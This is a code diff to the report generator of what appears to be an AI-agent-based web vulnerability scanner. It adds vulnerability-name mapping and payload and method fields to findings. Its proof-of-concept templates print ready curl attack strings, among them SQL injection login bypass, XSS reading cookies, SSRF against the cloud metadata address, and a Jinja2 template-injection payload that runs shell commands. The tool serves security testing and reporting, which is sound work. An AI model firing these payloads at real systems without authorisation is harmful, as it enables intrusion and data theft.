@@ -12,6 +12,43 @@ class Finding:
     vuln_type: str
     confidence: str
     reward: float
+    payload: str = ""
+    method: str = "GET"
+
+    def get(self, key, default=None):
+        """Allow dictionary-like access for GUI compatibility."""
+        if key == 'type': return self.vuln_type
+        return getattr(self, key, default)
+
+VULN_NAME_MAP = {
+    'attack_sqli_time_based': 'Time-Based SQL Injection',
+    'attack_sqli_': 'SQL Injection',
+    'attack_xss_': 'Cross-Site Scripting (XSS)',
+    'attack_idor_': 'Insecure Direct Object Reference (IDOR)',
+    'attack_bac_': 'Broken Access Control (BAC)',
+    'attack_csrf_': 'Cross-Site Request Forgery (CSRF)',
+    'attack_path_traversal_': 'Path Traversal',
+    'attack_ssti_': 'Server-Side Template Injection (SSTI)',
+    'attack_command_injection': 'Command Injection',
+    'attack_ssrf_': 'Server-Side Request Forgery (SSRF)',
+    'attack_mass_assignment': 'Broken Access Control (BAC)',
+    'attack_role_escalation': 'Broken Access Control (BAC)',
+    'attack_authorization_bypass': 'Broken Access Control (BAC)',
+    'test_login_bypass': 'SQL Injection',
+    'attack_insecure_api_keys': 'Sensitive Data Exposure',
+    'attack_info_disclosure_': 'Sensitive Data Exposure',
+}
+
+def normalize_vuln_name(tech_name: str) -> str:
+    """Maps technical action names to descriptive database keys."""
+    if tech_name in VULN_NAME_MAP:
+        return VULN_NAME_MAP[tech_name]
+    
+    for key, val in VULN_NAME_MAP.items():
+        if key.endswith('_') and tech_name.startswith(key):
+            return val
+            
+    return tech_name
 
 
 class ReportGenerator:
@@ -106,13 +143,17 @@ class ReportGenerator:
             if confirmed_findings:
                 f.write(f"## 🔴 Confirmed Vulnerabilities\n\n")
                 for idx, finding in enumerate(confirmed_findings, 1):
-                    vuln_info = vuln_db.get(finding.vuln_type, {})
+                    # Map technical name to descriptive name
+                    display_name = normalize_vuln_name(finding.vuln_type)
+                    vuln_info = vuln_db.get(display_name, {})
+                    
                     impact = vuln_info.get('impact', 'UNKNOWN')
                     emoji = "🔴" if impact == "CRITICAL" else "🟠" if impact == "HIGH" else "🟡"
                     
-                    f.write(f"### {idx}. {emoji} {finding.vuln_type}\n\n")
-                    f.write(f"> **Severity**: {impact} | **CVSS**: {vuln_info.get('cvss_score', 'N/A')} | **Confidence**: {finding.confidence}\n\n")
-                    f.write(f"- **Vulnerable URL**: `{finding.url}`\n\n")
+                    f.write(f"### {idx}. {emoji} {display_name}\n\n")
+                    f.write(f"> **Technical Name**: `{finding.vuln_type}` | **Severity**: {impact} | **CVSS**: {vuln_info.get('cvss_score', 'N/A')} | **Confidence**: {finding.confidence}\n\n")
+                    f.write(f"- **Vulnerable URL**: `{finding.url}`\n")
+                    f.write(f"- **HTTP Method**: `{finding.method}`\n\n")
                     
                     f.write(f"**📝 Description**\n")
                     f.write(f"{vuln_info.get('description', 'N/A')}\n\n")
@@ -132,54 +173,58 @@ class ReportGenerator:
                     
                     # ADD PROOF OF CONCEPT (COPY-PASTE READY)
                     f.write(f"**🧪 Proof of Concept (Copy & Paste)**\n")
+                    
+                    # Use actual payload if available
+                    if finding.payload:
+                        f.write(f"The AI Agent successfully exploited the vulnerability with the following payload:\n\n")
+                        f.write(f"```bash\n")
+                        if finding.method == 'POST':
+                            f.write(f"curl -X POST '{finding.url}' \\\n")
+                            f.write(f"  -H 'Content-Type: application/json' \\\n")
+                            f.write(f"  -d '{finding.payload}'\n")
+                        else:
+                            # Try to identify if payload is already in URL
+                            if '?' in finding.url and finding.payload in finding.url:
+                                f.write(f"curl '{finding.url}'\n")
+                            else:
+                                f.write(f"curl '{finding.url}?{finding.payload}'\n")
+                        f.write(f"```\n\n")
+                        f.write(f"**Alternative payloads for manual testing:**\n")
+
                     f.write(f"```bash\n")
                     
-                    # Generate specific PoC based on vulnerability type
-                    vuln_type = finding.vuln_type
+                    # Generate specific PoC examples based on normalized type
+                    vuln_type = display_name
                     url = finding.url
                     
                     if "SQL Injection" in vuln_type:
-                        f.write(f"# Test for SQL Injection\n")
-                        f.write(f"curl -X POST '{url}' \\\n")
-                        f.write(f"  -d \"username=admin' OR '1'='1&password=x\"\n\n")
-                        f.write(f"# Time-based blind SQLi\n")
-                        f.write(f"curl '{url}?id=1' OR SLEEP(5)--'\n\n")
-                        f.write(f"# Extract database name\n")
-                        f.write(f"curl '{url}?id=1' UNION SELECT database(),2,3--'\n")
+                        f.write(f"# Generic login bypass\n")
+                        f.write(f"curl -X POST '{url}' -d \"username=admin' OR '1'='1&password=x\"\n\n")
+                        f.write(f"# Time-based blind SQLi test\n")
+                        f.write(f"curl '{url}?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--\n")
                     
                     elif "XSS" in vuln_type:
-                        f.write(f"# Test for XSS\n")
+                        f.write(f"# Basic alert test\n")
                         f.write(f"curl '{url}?q=<script>alert(1)</script>'\n\n")
-                        f.write(f"# Advanced XSS payload\n")
-                        f.write(f"curl '{url}?q=<img src=x onerror=alert(document.cookie)>'\n\n")
-                        f.write(f"# Polyglot payload\n")
-                        f.write(f"curl '{url}?q=javascript:/*--></title></style></textarea></script></xmp>\">\\\\'/*\\\"/*\\`/*\\' /*</template></noembed></noscript></title></style></script>--><svg/onload=alert(1)>'\n")
+                        f.write(f"# Cookie theft attempt\n")
+                        f.write(f"curl '{url}?q=<img src=x onerror=alert(document.cookie)>'\n")
                     
                     elif "SSRF" in vuln_type:
-                        f.write(f"# Test for SSRF\n")
-                        f.write(f"curl '{url}?url=http://169.254.169.254/latest/meta-data/'\n\n")
-                        f.write(f"# Try to access internal services\n")
-                        f.write(f"curl '{url}?url=http://localhost:22'\n\n")
-                        f.write(f"# AWS metadata\n")
-                        f.write(f"curl '{url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n")
+                        f.write(f"# Access internal metadata\n")
+                        f.write(f"curl '{url}?url=http://169.254.169.254/latest/meta-data/'\n")
                     
                     elif "IDOR" in vuln_type:
-                        f.write(f"# Test for IDOR\n")
-                        f.write(f"curl '{url}?id=1'\n")
-                        f.write(f"curl '{url}?id=2'\n")
-                        f.write(f"curl '{url}?id=999'\n\n")
-                        f.write(f"# Try accessing admin resources\n")
-                        f.write(f"curl '{url}?uid=admin'\n")
+                        f.write(f"# Access other user data\n")
+                        f.write(f"curl '{url.rsplit('/', 1)[0]}/profile/2'\n")
                     
-                    elif "Broken Access Control" in vuln_type:
-                        f.write(f"# Test for BAC\n")
-                        f.write(f"curl '{url}' \\\n")
-                        f.write(f"  -H 'X-Original-URL: /admin'\n\n")
-                        f.write(f"# Try direct access to admin endpoints\n")
-                        f.write(f"curl '{url.rsplit('/', 1)[0]}/admin/users'\n")
+                    elif "SSTI" in vuln_type:
+                        f.write(f"# Test for Jinja2 expression\n")
+                        f.write(f"curl '{url}?name={{{{7*7}}}}'\n\n")
+                        f.write(f"# Attempt RCE (Jinja2)\n")
+                        f.write(f"curl '{url}?name={{{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}}}'\n")
                     
                     else:
-                        f.write(f"# Manual testing required\n")
+                        f.write(f"# Manual verification\n")
                         f.write(f"curl -v '{url}'\n")
                     
                     f.write(f"```\n\n")
@@ -224,9 +269,13 @@ class ReportGenerator:
         stats = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
         
         for finding in findings:
-            impact = vuln_db.get(finding.vuln_type, {}).get('impact', '').upper()
+            display_name = normalize_vuln_name(finding.vuln_type)
+            impact = vuln_db.get(display_name, {}).get('impact', '').upper()
             if impact in stats:
                 stats[impact.lower()] += 1
+            else:
+                # Default to medium if not found but is a finding
+                stats['medium'] += 1
         
         return stats
     
@@ -256,10 +305,11 @@ class ReportGenerator:
             f.write("=" * 70 + "\n\n")
             
             for idx, finding in enumerate(findings, 1):
-                vuln_info = vuln_db.get(finding.vuln_type, {})
+                display_name = normalize_vuln_name(finding.vuln_type)
+                vuln_info = vuln_db.get(display_name, {})
                 impact = vuln_info.get('impact', 'UNKNOWN')
                 
-                f.write(f"[{idx}] {finding.vuln_type}\n")
+                f.write(f"[{idx}] {display_name}\n")
                 f.write("-" * 70 + "\n")
                 f.write(f"Impact Level:  {impact}\n")
                 f.write(f"CVSS Score:    {vuln_info.get('cvss_score', 'N/A')}\n")
@@ -356,11 +406,14 @@ class ReportGenerator:
 """
         
         for idx, finding in enumerate(findings, 1):
-            vuln_info = vuln_db.get(finding.vuln_type, {})
+            display_name = normalize_vuln_name(finding.vuln_type)
+            vuln_info = vuln_db.get(display_name, {})
+            impact = vuln_info.get('impact', 'UNKNOWN')
             html += f"""
         <div class="vulnerability">
-            <h3>#{idx}. {finding.vuln_type}</h3>
-            <p><strong>Impact:</strong> {vuln_info.get('impact', 'UNKNOWN')}</p>
+            <h3>#{idx}. {display_name}</h3>
+            <p><strong>Technical Name:</strong> {finding.vuln_type}</p>
+            <p><strong>Impact:</strong> {impact}</p>
             <p><strong>CVSS Score:</strong> {vuln_info.get('cvss_score', 'N/A')}</p>
             <p><strong>URL:</strong> {finding.url}</p>
             <p>{vuln_info.get('description', '')}</p>
